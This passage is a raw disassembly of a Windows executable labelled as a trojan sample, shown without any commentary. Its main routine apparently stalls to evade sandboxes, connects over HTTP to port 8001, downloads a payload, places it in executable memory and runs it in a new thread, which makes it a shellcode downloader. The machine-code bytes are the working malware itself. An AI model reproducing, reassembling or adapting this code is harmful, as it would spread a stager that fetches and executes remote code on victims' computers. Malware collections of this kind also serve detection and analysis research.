
malware_samples/trojan/f244c0520231ec5a3fe6eff638cbbc80d778f4b33db88ab278634a7758e5c926.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 05 01 47 00 00 	lea    0x4701(%rip),%rax        # 0x140005708
   140001007:	c3                   	ret
   140001008:	cc                   	int3
   140001009:	cc                   	int3
   14000100a:	cc                   	int3
   14000100b:	cc                   	int3
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001015:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000101a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000101f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001024:	53                   	push   %rbx
   140001025:	56                   	push   %rsi
   140001026:	57                   	push   %rdi
   140001027:	48 83 ec 30          	sub    $0x30,%rsp
   14000102b:	48 8b f9             	mov    %rcx,%rdi
   14000102e:	48 8d 74 24 58       	lea    0x58(%rsp),%rsi
   140001033:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001038:	ff 15 3a 22 00 00    	call   *0x223a(%rip)        # 0x140003278
   14000103e:	48 8b d8             	mov    %rax,%rbx
   140001041:	e8 ba ff ff ff       	call   0x140001000
   140001046:	45 33 c9             	xor    %r9d,%r9d
   140001049:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000104e:	4c 8b c7             	mov    %rdi,%r8
   140001051:	48 8b d3             	mov    %rbx,%rdx
   140001054:	48 8b 08             	mov    (%rax),%rcx
   140001057:	ff 15 03 22 00 00    	call   *0x2203(%rip)        # 0x140003260
   14000105d:	48 83 c4 30          	add    $0x30,%rsp
   140001061:	5f                   	pop    %rdi
   140001062:	5e                   	pop    %rsi
   140001063:	5b                   	pop    %rbx
   140001064:	c3                   	ret
   140001065:	cc                   	int3
   140001066:	cc                   	int3
   140001067:	cc                   	int3
   140001068:	cc                   	int3
   140001069:	cc                   	int3
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	40 53                	rex push %rbx
   140001072:	48 83 ec 20          	sub    $0x20,%rsp
   140001076:	48 8b d9             	mov    %rcx,%rbx
   140001079:	48 8b c2             	mov    %rdx,%rax
   14000107c:	48 8d 0d c5 22 00 00 	lea    0x22c5(%rip),%rcx        # 0x140003348
   140001083:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001086:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000108a:	48 89 0b             	mov    %rcx,(%rbx)
   14000108d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001091:	0f 11 02             	movups %xmm0,(%rdx)
   140001094:	ff 15 7e 20 00 00    	call   *0x207e(%rip)        # 0x140003118
   14000109a:	48 8b c3             	mov    %rbx,%rax
   14000109d:	48 83 c4 20          	add    $0x20,%rsp
   1400010a1:	5b                   	pop    %rbx
   1400010a2:	c3                   	ret
   1400010a3:	cc                   	int3
   1400010a4:	cc                   	int3
   1400010a5:	cc                   	int3
   1400010a6:	cc                   	int3
   1400010a7:	cc                   	int3
   1400010a8:	cc                   	int3
   1400010a9:	cc                   	int3
   1400010aa:	cc                   	int3
   1400010ab:	cc                   	int3
   1400010ac:	cc                   	int3
   1400010ad:	cc                   	int3
   1400010ae:	cc                   	int3
   1400010af:	cc                   	int3
   1400010b0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400010b4:	48 8d 05 f5 22 00 00 	lea    0x22f5(%rip),%rax        # 0x1400033b0
   1400010bb:	48 85 d2             	test   %rdx,%rdx
   1400010be:	48 0f 45 c2          	cmovne %rdx,%rax
   1400010c2:	c3                   	ret
   1400010c3:	cc                   	int3
   1400010c4:	cc                   	int3
   1400010c5:	cc                   	int3
   1400010c6:	cc                   	int3
   1400010c7:	cc                   	int3
   1400010c8:	cc                   	int3
   1400010c9:	cc                   	int3
   1400010ca:	cc                   	int3
   1400010cb:	cc                   	int3
   1400010cc:	cc                   	int3
   1400010cd:	cc                   	int3
   1400010ce:	cc                   	int3
   1400010cf:	cc                   	int3
   1400010d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400010d5:	57                   	push   %rdi
   1400010d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400010da:	48 8d 05 67 22 00 00 	lea    0x2267(%rip),%rax        # 0x140003348
   1400010e1:	48 8b f9             	mov    %rcx,%rdi
   1400010e4:	48 89 01             	mov    %rax,(%rcx)
   1400010e7:	8b da                	mov    %edx,%ebx
   1400010e9:	48 83 c1 08          	add    $0x8,%rcx
   1400010ed:	ff 15 ed 1f 00 00    	call   *0x1fed(%rip)        # 0x1400030e0
   1400010f3:	f6 c3 01             	test   $0x1,%bl
   1400010f6:	74 0d                	je     0x140001105
   1400010f8:	ba 18 00 00 00       	mov    $0x18,%edx
   1400010fd:	48 8b cf             	mov    %rdi,%rcx
   140001100:	e8 67 07 00 00       	call   0x14000186c
   140001105:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000110a:	48 8b c7             	mov    %rdi,%rax
   14000110d:	48 83 c4 20          	add    $0x20,%rsp
   140001111:	5f                   	pop    %rdi
   140001112:	c3                   	ret
   140001113:	cc                   	int3
   140001114:	cc                   	int3
   140001115:	cc                   	int3
   140001116:	cc                   	int3
   140001117:	cc                   	int3
   140001118:	cc                   	int3
   140001119:	cc                   	int3
   14000111a:	cc                   	int3
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	48 8d 05 21 22 00 00 	lea    0x2221(%rip),%rax        # 0x140003348
   140001127:	48 89 01             	mov    %rax,(%rcx)
   14000112a:	48 83 c1 08          	add    $0x8,%rcx
   14000112e:	48 ff 25 ab 1f 00 00 	rex.W jmp *0x1fab(%rip)        # 0x1400030e0
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 8d 05 81 22 00 00 	lea    0x2281(%rip),%rax        # 0x1400033c8
   140001147:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000114e:	00 
   14000114f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001153:	48 8d 05 2e 22 00 00 	lea    0x222e(%rip),%rax        # 0x140003388
   14000115a:	48 89 01             	mov    %rax,(%rcx)
   14000115d:	48 8b c1             	mov    %rcx,%rax
   140001160:	c3                   	ret
   140001161:	cc                   	int3
   140001162:	cc                   	int3
   140001163:	cc                   	int3
   140001164:	cc                   	int3
   140001165:	cc                   	int3
   140001166:	cc                   	int3
   140001167:	cc                   	int3
   140001168:	cc                   	int3
   140001169:	cc                   	int3
   14000116a:	cc                   	int3
   14000116b:	cc                   	int3
   14000116c:	cc                   	int3
   14000116d:	cc                   	int3
   14000116e:	cc                   	int3
   14000116f:	cc                   	int3
   140001170:	48 83 ec 48          	sub    $0x48,%rsp
   140001174:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001179:	e8 c2 ff ff ff       	call   0x140001140
   14000117e:	48 8d 15 13 2e 00 00 	lea    0x2e13(%rip),%rdx        # 0x140003f98
   140001185:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000118a:	e8 47 14 00 00       	call   0x1400025d6
   14000118f:	cc                   	int3
   140001190:	40 53                	rex push %rbx
   140001192:	48 83 ec 20          	sub    $0x20,%rsp
   140001196:	48 8b d9             	mov    %rcx,%rbx
   140001199:	48 8b c2             	mov    %rdx,%rax
   14000119c:	48 8d 0d a5 21 00 00 	lea    0x21a5(%rip),%rcx        # 0x140003348
   1400011a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400011a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400011aa:	48 89 0b             	mov    %rcx,(%rbx)
   1400011ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400011b1:	0f 11 02             	movups %xmm0,(%rdx)
   1400011b4:	ff 15 5e 1f 00 00    	call   *0x1f5e(%rip)        # 0x140003118
   1400011ba:	48 8d 05 c7 21 00 00 	lea    0x21c7(%rip),%rax        # 0x140003388
   1400011c1:	48 89 03             	mov    %rax,(%rbx)
   1400011c4:	48 8b c3             	mov    %rbx,%rax
   1400011c7:	48 83 c4 20          	add    $0x20,%rsp
   1400011cb:	5b                   	pop    %rbx
   1400011cc:	c3                   	ret
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	40 53                	rex push %rbx
   1400011d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400011d6:	48 8b d9             	mov    %rcx,%rbx
   1400011d9:	48 8b c2             	mov    %rdx,%rax
   1400011dc:	48 8d 0d 65 21 00 00 	lea    0x2165(%rip),%rcx        # 0x140003348
   1400011e3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400011e6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400011ea:	48 89 0b             	mov    %rcx,(%rbx)
   1400011ed:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400011f1:	0f 11 02             	movups %xmm0,(%rdx)
   1400011f4:	ff 15 1e 1f 00 00    	call   *0x1f1e(%rip)        # 0x140003118
   1400011fa:	48 8d 05 5f 21 00 00 	lea    0x215f(%rip),%rax        # 0x140003360
   140001201:	48 89 03             	mov    %rax,(%rbx)
   140001204:	48 8b c3             	mov    %rbx,%rax
   140001207:	48 83 c4 20          	add    $0x20,%rsp
   14000120b:	5b                   	pop    %rbx
   14000120c:	c3                   	ret
   14000120d:	cc                   	int3
   14000120e:	cc                   	int3
   14000120f:	cc                   	int3
   140001210:	40 55                	rex push %rbp
   140001212:	53                   	push   %rbx
   140001213:	48 8d ac 24 58 f0 ff 	lea    -0xfa8(%rsp),%rbp
   14000121a:	ff 
   14000121b:	b8 a8 10 00 00       	mov    $0x10a8,%eax
   140001220:	e8 eb 14 00 00       	call   0x140002710
   140001225:	48 2b e0             	sub    %rax,%rsp
   140001228:	48 8b 05 d1 3d 00 00 	mov    0x3dd1(%rip),%rax        # 0x140005000
   14000122f:	48 33 c4             	xor    %rsp,%rax
   140001232:	48 89 85 90 0f 00 00 	mov    %rax,0xf90(%rbp)
   140001239:	ff 15 e1 1d 00 00    	call   *0x1de1(%rip)        # 0x140003020
   14000123f:	b9 88 13 00 00       	mov    $0x1388,%ecx
   140001244:	48 8b d8             	mov    %rax,%rbx
   140001247:	ff 15 cb 1d 00 00    	call   *0x1dcb(%rip)        # 0x140003018
   14000124d:	ff 15 cd 1d 00 00    	call   *0x1dcd(%rip)        # 0x140003020
   140001253:	2b c3                	sub    %ebx,%eax
   140001255:	3d 94 11 00 00       	cmp    $0x1194,%eax
   14000125a:	7d 09                	jge    0x140001265
   14000125c:	33 c9                	xor    %ecx,%ecx
   14000125e:	ff 15 cc 1f 00 00    	call   *0x1fcc(%rip)        # 0x140003230
   140001264:	cc                   	int3
   140001265:	66 0f 6f 0d a3 22 00 	movdqa 0x22a3(%rip),%xmm1        # 0x140003510
   14000126c:	00 
   14000126d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001270:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140001275:	48 89 b4 24 c0 10 00 	mov    %rsi,0x10c0(%rsp)
   14000127c:	00 
   14000127d:	48 89 bc 24 c8 10 00 	mov    %rdi,0x10c8(%rsp)
   140001284:	00 
   140001285:	c7 44 24 58 38 30 30 	movl   $0x31303038,0x58(%rsp)
   14000128c:	31 
   14000128d:	c6 44 24 5c 00       	movb   $0x0,0x5c(%rsp)
   140001292:	4c 89 b4 24 d0 10 00 	mov    %r14,0x10d0(%rsp)
   140001299:	00 
   14000129a:	f3 0f 7f 4c 24 68    	movdqu %xmm1,0x68(%rsp)
   1400012a0:	ff 15 72 1f 00 00    	call   *0x1f72(%rip)        # 0x140003218
   1400012a6:	48 83 7c 24 70 0f    	cmpq   $0xf,0x70(%rsp)
   1400012ac:	48 8d 5c 24 58       	lea    0x58(%rsp),%rbx
   1400012b1:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400012b7:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   1400012bc:	48 0f 47 5c 24 58    	cmova  0x58(%rsp),%rbx
   1400012c2:	48 8b f0             	mov    %rax,%rsi
   1400012c5:	33 ff                	xor    %edi,%edi
   1400012c7:	48 8b cb             	mov    %rbx,%rcx
   1400012ca:	89 38                	mov    %edi,(%rax)
   1400012cc:	ff 15 9e 1e 00 00    	call   *0x1e9e(%rip)        # 0x140003170
   1400012d2:	44 8b f0             	mov    %eax,%r14d
   1400012d5:	48 3b 5c 24 78       	cmp    0x78(%rsp),%rbx
   1400012da:	75 0e                	jne    0x1400012ea
   1400012dc:	48 8d 0d fd 20 00 00 	lea    0x20fd(%rip),%rcx        # 0x1400033e0
   1400012e3:	ff 15 d7 1d 00 00    	call   *0x1dd7(%rip)        # 0x1400030c0
   1400012e9:	cc                   	int3
   1400012ea:	83 3e 22             	cmpl   $0x22,(%rsi)
   1400012ed:	75 0e                	jne    0x1400012fd
   1400012ef:	48 8d 0d 02 21 00 00 	lea    0x2102(%rip),%rcx        # 0x1400033f8
   1400012f6:	ff 15 d4 1d 00 00    	call   *0x1dd4(%rip)        # 0x1400030d0
   1400012fc:	cc                   	int3
   1400012fd:	45 33 c9             	xor    %r9d,%r9d
   140001300:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140001304:	45 33 c0             	xor    %r8d,%r8d
   140001307:	ba 04 00 00 00       	mov    $0x4,%edx
   14000130c:	33 c9                	xor    %ecx,%ecx
   14000130e:	ff 15 34 1e 00 00    	call   *0x1e34(%rip)        # 0x140003148
   140001314:	45 33 c9             	xor    %r9d,%r9d
   140001317:	48 8d 15 22 21 00 00 	lea    0x2122(%rip),%rdx        # 0x140003440
   14000131e:	48 8b c8             	mov    %rax,%rcx
   140001321:	45 0f b7 c6          	movzwl %r14w,%r8d
   140001325:	48 8b f0             	mov    %rax,%rsi
   140001328:	ff 15 32 1e 00 00    	call   *0x1e32(%rip)        # 0x140003160
   14000132e:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140001332:	4c 8d 05 e7 20 00 00 	lea    0x20e7(%rip),%r8        # 0x140003420
   140001339:	48 8b c8             	mov    %rax,%rcx
   14000133c:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001341:	45 33 c9             	xor    %r9d,%r9d
   140001344:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001349:	48 8d 15 c8 20 00 00 	lea    0x20c8(%rip),%rdx        # 0x140003418
   140001350:	4c 8b f0             	mov    %rax,%r14
   140001353:	ff 15 d7 1d 00 00    	call   *0x1dd7(%rip)        # 0x140003130
   140001359:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000135e:	45 33 c9             	xor    %r9d,%r9d
   140001361:	48 8b c8             	mov    %rax,%rcx
   140001364:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140001368:	45 33 c0             	xor    %r8d,%r8d
   14000136b:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000136f:	33 d2                	xor    %edx,%edx
   140001371:	48 8b d8             	mov    %rax,%rbx
   140001374:	ff 15 de 1d 00 00    	call   *0x1dde(%rip)        # 0x140003158
   14000137a:	33 d2                	xor    %edx,%edx
   14000137c:	48 8b cb             	mov    %rbx,%rcx
   14000137f:	ff 15 bb 1d 00 00    	call   *0x1dbb(%rip)        # 0x140003140
   140001385:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001388:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   14000138d:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   140001393:	89 7c 24 78          	mov    %edi,0x78(%rsp)
   140001397:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000139e:	00 00 
   1400013a0:	33 d2                	xor    %edx,%edx
   1400013a2:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400013a6:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400013ac:	e8 37 12 00 00       	call   0x1400025e8
   1400013b1:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   1400013b6:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400013bc:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   1400013c0:	48 8b cb             	mov    %rbx,%rcx
   1400013c3:	ff 15 87 1d 00 00    	call   *0x1d87(%rip)        # 0x140003150
   1400013c9:	8b 44 24 78          	mov    0x78(%rsp),%eax
   1400013cd:	85 c0                	test   %eax,%eax
   1400013cf:	74 1c                	je     0x1400013ed
   1400013d1:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400013d6:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   1400013da:	44 8b c8             	mov    %eax,%r9d
   1400013dd:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400013e2:	e8 b9 01 00 00       	call   0x1400015a0
   1400013e7:	39 7c 24 78          	cmp    %edi,0x78(%rsp)
   1400013eb:	77 b3                	ja     0x1400013a0
   1400013ed:	48 8b cb             	mov    %rbx,%rcx
   1400013f0:	ff 15 42 1d 00 00    	call   *0x1d42(%rip)        # 0x140003138
   1400013f6:	49 8b ce             	mov    %r14,%rcx
   1400013f9:	ff 15 39 1d 00 00    	call   *0x1d39(%rip)        # 0x140003138
   1400013ff:	48 8b ce             	mov    %rsi,%rcx
   140001402:	ff 15 30 1d 00 00    	call   *0x1d30(%rip)        # 0x140003138
   140001408:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   14000140d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001412:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140001417:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000141b:	76 35                	jbe    0x140001452
   14000141d:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001422:	48 ff c2             	inc    %rdx
   140001425:	48 8b c1             	mov    %rcx,%rax
   140001428:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000142f:	72 1c                	jb     0x14000144d
   140001431:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001435:	48 83 c2 27          	add    $0x27,%rdx
   140001439:	48 2b c1             	sub    %rcx,%rax
   14000143c:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001440:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001444:	76 07                	jbe    0x14000144d
   140001446:	ff 15 bc 1d 00 00    	call   *0x1dbc(%rip)        # 0x140003208
   14000144c:	cc                   	int3
   14000144d:	e8 1a 04 00 00       	call   0x14000186c
   140001452:	4c 89 bc 24 a0 10 00 	mov    %r15,0x10a0(%rsp)
   140001459:	00 
   14000145a:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140001460:	4c 8b 7c 24 48       	mov    0x48(%rsp),%r15
   140001465:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   14000146b:	4c 2b fb             	sub    %rbx,%r15
   14000146e:	33 c9                	xor    %ecx,%ecx
   140001470:	49 8b d7             	mov    %r15,%rdx
   140001473:	ff 15 8f 1b 00 00    	call   *0x1b8f(%rip)        # 0x140003008
   140001479:	4c 8b f0             	mov    %rax,%r14
   14000147c:	48 85 c0             	test   %rax,%rax
   14000147f:	75 0e                	jne    0x14000148f
   140001481:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140001486:	4c 8d 35 d3 1f 00 00 	lea    0x1fd3(%rip),%r14        # 0x140003460
   14000148d:	eb 65                	jmp    0x1400014f4
   14000148f:	4d 8b c7             	mov    %r15,%r8
   140001492:	48 8b d3             	mov    %rbx,%rdx
   140001495:	49 8b ce             	mov    %r14,%rcx
   140001498:	e8 c1 12 00 00       	call   0x14000275e
   14000149d:	4c 8d 4d 80          	lea    -0x80(%rbp),%r9
   1400014a1:	ba 18 00 00 00       	mov    $0x18,%edx
   1400014a6:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   1400014ac:	49 8b ce             	mov    %r14,%rcx
   1400014af:	ff 15 4b 1b 00 00    	call   *0x1b4b(%rip)        # 0x140003000
   1400014b5:	85 c0                	test   %eax,%eax
   1400014b7:	75 0e                	jne    0x1400014c7
   1400014b9:	bf fe ff ff ff       	mov    $0xfffffffe,%edi
   1400014be:	4c 8d 35 bb 1f 00 00 	lea    0x1fbb(%rip),%r14        # 0x140003480
   1400014c5:	eb 2d                	jmp    0x1400014f4
   1400014c7:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400014cc:	45 33 c9             	xor    %r9d,%r9d
   1400014cf:	4d 8b c6             	mov    %r14,%r8
   1400014d2:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1400014d6:	33 d2                	xor    %edx,%edx
   1400014d8:	33 c9                	xor    %ecx,%ecx
   1400014da:	ff 15 50 1b 00 00    	call   *0x1b50(%rip)        # 0x140003030
   1400014e0:	4c 8b f8             	mov    %rax,%r15
   1400014e3:	48 85 c0             	test   %rax,%rax
   1400014e6:	75 1e                	jne    0x140001506
   1400014e8:	bf fd ff ff ff       	mov    $0xfffffffd,%edi
   1400014ed:	4c 8d 35 c4 1f 00 00 	lea    0x1fc4(%rip),%r14        # 0x1400034b8
   1400014f4:	ff 15 2e 1b 00 00    	call   *0x1b2e(%rip)        # 0x140003028
   1400014fa:	8b d0                	mov    %eax,%edx
   1400014fc:	49 8b ce             	mov    %r14,%rcx
   1400014ff:	e8 0c fb ff ff       	call   0x140001010
   140001504:	eb 20                	jmp    0x140001526
   140001506:	49 8b d6             	mov    %r14,%rdx
   140001509:	48 8d 0d c0 1f 00 00 	lea    0x1fc0(%rip),%rcx        # 0x1400034d0
   140001510:	e8 fb fa ff ff       	call   0x140001010
   140001515:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000151a:	49 8b cf             	mov    %r15,%rcx
   14000151d:	ff 15 ed 1a 00 00    	call   *0x1aed(%rip)        # 0x140003010
   140001523:	41 ff d6             	call   *%r14
   140001526:	4c 8b bc 24 a0 10 00 	mov    0x10a0(%rsp),%r15
   14000152d:	00 
   14000152e:	48 85 db             	test   %rbx,%rbx
   140001531:	74 2f                	je     0x140001562
   140001533:	48 2b f3             	sub    %rbx,%rsi
   140001536:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   14000153d:	72 18                	jb     0x140001557
   14000153f:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   140001543:	48 83 c6 27          	add    $0x27,%rsi
   140001547:	48 2b d9             	sub    %rcx,%rbx
   14000154a:	48 8d 43 f8          	lea    -0x8(%rbx),%rax
   14000154e:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001552:	77 41                	ja     0x140001595
   140001554:	48 8b d9             	mov    %rcx,%rbx
   140001557:	48 8b d6             	mov    %rsi,%rdx
   14000155a:	48 8b cb             	mov    %rbx,%rcx
   14000155d:	e8 0a 03 00 00       	call   0x14000186c
   140001562:	48 8b b4 24 c0 10 00 	mov    0x10c0(%rsp),%rsi
   140001569:	00 
   14000156a:	8b c7                	mov    %edi,%eax
   14000156c:	48 8b bc 24 c8 10 00 	mov    0x10c8(%rsp),%rdi
   140001573:	00 
   140001574:	4c 8b b4 24 d0 10 00 	mov    0x10d0(%rsp),%r14
   14000157b:	00 
   14000157c:	48 8b 8d 90 0f 00 00 	mov    0xf90(%rbp),%rcx
   140001583:	48 33 cc             	xor    %rsp,%rcx
   140001586:	e8 85 02 00 00       	call   0x140001810
   14000158b:	48 81 c4 a8 10 00 00 	add    $0x10a8,%rsp
   140001592:	5b                   	pop    %rbx
   140001593:	5d                   	pop    %rbp
   140001594:	c3                   	ret
   140001595:	ff 15 6d 1c 00 00    	call   *0x1c6d(%rip)        # 0x140003208
   14000159b:	cc                   	int3
   14000159c:	cc                   	int3
   14000159d:	cc                   	int3
   14000159e:	cc                   	int3
   14000159f:	cc                   	int3
   1400015a0:	40 53                	rex push %rbx
   1400015a2:	55                   	push   %rbp
   1400015a3:	56                   	push   %rsi
   1400015a4:	57                   	push   %rdi
   1400015a5:	41 54                	push   %r12
   1400015a7:	41 56                	push   %r14
   1400015a9:	48 83 ec 48          	sub    $0x48,%rsp
   1400015ad:	48 8b 39             	mov    (%rcx),%rdi
   1400015b0:	49 8b f1             	mov    %r9,%rsi
   1400015b3:	4c 8b 61 08          	mov    0x8(%rcx),%r12
   1400015b7:	49 8b e8             	mov    %r8,%rbp
   1400015ba:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400015bf:	48 8b da             	mov    %rdx,%rbx
   1400015c2:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   1400015c7:	4c 8b f1             	mov    %rcx,%r14
   1400015ca:	4d 85 c9             	test   %r9,%r9
   1400015cd:	0f 84 e6 01 00 00    	je     0x1400017b9
   1400015d3:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   1400015d7:	48 8b c1             	mov    %rcx,%rax
   1400015da:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1400015df:	49 2b c4             	sub    %r12,%rax
   1400015e2:	4c 3b c8             	cmp    %rax,%r9
   1400015e5:	0f 86 4f 01 00 00    	jbe    0x14000173a
   1400015eb:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   1400015f2:	00 
   1400015f3:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   1400015fa:	ff ff 7f 
   1400015fd:	4d 8b ec             	mov    %r12,%r13
   140001600:	48 8b c5             	mov    %rbp,%rax
   140001603:	4c 2b ef             	sub    %rdi,%r13
   140001606:	49 2b c5             	sub    %r13,%rax
   140001609:	4c 3b c8             	cmp    %rax,%r9
   14000160c:	0f 87 b4 01 00 00    	ja     0x1400017c6
   140001612:	48 2b cf             	sub    %rdi,%rcx
   140001615:	4f 8d 04 29          	lea    (%r9,%r13,1),%r8
   140001619:	48 8b d1             	mov    %rcx,%rdx
   14000161c:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
   140001621:	48 d1 ea             	shr    $1,%rdx
   140001624:	48 8b c5             	mov    %rbp,%rax
   140001627:	48 2b c2             	sub    %rdx,%rax
   14000162a:	48 3b c8             	cmp    %rax,%rcx
   14000162d:	76 26                	jbe    0x140001655
   14000162f:	48 b9 26 00 00 00 00 	movabs $0x8000000000000026,%rcx
   140001636:	00 00 80 
   140001639:	e8 f2 01 00 00       	call   0x140001830
   14000163e:	48 85 c0             	test   %rax,%rax
   140001641:	0f 84 ec 00 00 00    	je     0x140001733
   140001647:	48 8d 78 27          	lea    0x27(%rax),%rdi
   14000164b:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   14000164f:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140001653:	eb 3a                	jmp    0x14000168f
   140001655:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   140001659:	49 8b e8             	mov    %r8,%rbp
   14000165c:	49 3b c0             	cmp    %r8,%rax
   14000165f:	48 0f 43 e8          	cmovae %rax,%rbp
   140001663:	48 85 ed             	test   %rbp,%rbp
   140001666:	75 04                	jne    0x14000166c
   140001668:	33 ff                	xor    %edi,%edi
   14000166a:	eb 23                	jmp    0x14000168f
   14000166c:	48 81 fd 00 10 00 00 	cmp    $0x1000,%rbp
   140001673:	72 0f                	jb     0x140001684
   140001675:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   140001679:	48 3b cd             	cmp    %rbp,%rcx
   14000167c:	0f 86 4a 01 00 00    	jbe    0x1400017cc
   140001682:	eb b5                	jmp    0x140001639
   140001684:	48 8b cd             	mov    %rbp,%rcx
   140001687:	e8 a4 01 00 00       	call   0x140001830
   14000168c:	48 8b f8             	mov    %rax,%rdi
   14000168f:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140001694:	4c 8b fb             	mov    %rbx,%r15
   140001697:	4c 2b 7c 24 20       	sub    0x20(%rsp),%r15
   14000169c:	4c 8b c6             	mov    %rsi,%r8
   14000169f:	4a 8d 0c 3f          	lea    (%rdi,%r15,1),%rcx
   1400016a3:	e8 bc 10 00 00       	call   0x140002764
   1400016a8:	48 83 fe 01          	cmp    $0x1,%rsi
   1400016ac:	75 12                	jne    0x1400016c0
   1400016ae:	49 3b dc             	cmp    %r12,%rbx
   1400016b1:	75 0d                	jne    0x1400016c0
   1400016b3:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   1400016b8:	4d 8b c5             	mov    %r13,%r8
   1400016bb:	48 8b cf             	mov    %rdi,%rcx
   1400016be:	eb 20                	jmp    0x1400016e0
   1400016c0:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   1400016c5:	4d 8b c7             	mov    %r15,%r8
   1400016c8:	48 8b cf             	mov    %rdi,%rcx
   1400016cb:	e8 94 10 00 00       	call   0x140002764
   1400016d0:	4c 2b e3             	sub    %rbx,%r12
   1400016d3:	48 8d 0c 3e          	lea    (%rsi,%rdi,1),%rcx
   1400016d7:	49 03 cf             	add    %r15,%rcx
   1400016da:	4d 8b c4             	mov    %r12,%r8
   1400016dd:	48 8b d3             	mov    %rbx,%rdx
   1400016e0:	e8 7f 10 00 00       	call   0x140002764
   1400016e5:	49 8b 0e             	mov    (%r14),%rcx
   1400016e8:	48 85 c9             	test   %rcx,%rcx
